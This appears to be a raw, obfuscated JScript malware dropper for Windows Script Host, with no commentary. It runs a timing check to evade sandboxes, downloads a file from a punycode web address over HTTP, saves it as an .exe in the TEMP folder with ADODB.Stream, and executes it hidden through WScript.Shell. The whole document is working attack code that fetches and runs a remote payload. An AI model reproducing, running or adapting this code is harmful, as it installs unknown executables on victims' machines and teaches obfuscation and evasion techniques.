var E0 = false;
var aH = "CreateObject";
var rI = function IS() {return WScript[aH]("WScript.Shell");}(), MM = 11;
var WE = "MSXML2.XMLHTTP";
var XK = 2123213;
var qL = 0;
function E(B0){rI["Run"](B0, qL, qL);};
function l(){return "" + WE;};
function e(Aa, l0){qL = qL * 1; return Aa - l0;};
function qd(){return aH;};
/*@cc_on
  @if (@_win32 || @_win64)
    E0 = true;
  @end
@*/
if (E0)
{
var Fr = "";
function eb(){return 22;};
var hF = 0; var D0 = 0;
function YB()
{
var Q = new this["Date"]();
var KQ = Q["getUTCMilliseconds"]();
WScript["Sleep"](eb());
var Q = new this["Date"]();
var HU = Q["getUTCMilliseconds"]();
WScript["Sleep"](eb());
var Q = new this["Date"]();
var yb = Q["getUTCMilliseconds"]();
var hF = "Eq";
hF = e(HU, KQ);
var D0 = "h";
D0 = e(yb, HU);
Fr = "open";
return e(hF, D0);
}
var c = false;
var mX = false;
for (var s = qL; s < eb() * 1; s++){if (YB() != qL){
c = true; 
D0 = "31" + 11 * hF + D0; 
mX = true; 
break;
}}
function y() {return ((c == true) && (c == mX)) ? 1 : qL;};
if (c && y() && mX){
function D() {return rI["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "kY6tZ4JofFNVy.exe";};
 yv = l();
 Y = WScript[aH](yv);
 var B = 1;
 while (B){
try {
Y[Fr]("GET", "http://xn--kandypriv-j4a.com/lo4sad", false);
Y["send"]();
q = "Sleep";
for (;;){WScript[q](eb() * 11); if (Y["readystate"] >= 2 * 2) break;};
B = qL;
} catch(jE){};
}
function PV(mQ) {var xM = (1, 2, 3, 4, 5, mQ); return xM;};
i = WScript[qd()]("ADODB.Stream");
yv = i;
yv[Fr]();
yv["type"] = PV(1);
yv["write"](Y["ResponseBody"]);
i["position"] = PV(qL);
yv["Save" + "ToFile"](D(), 2);
i["c"+"lose"]();
XG = D();
E(XG);
}
}

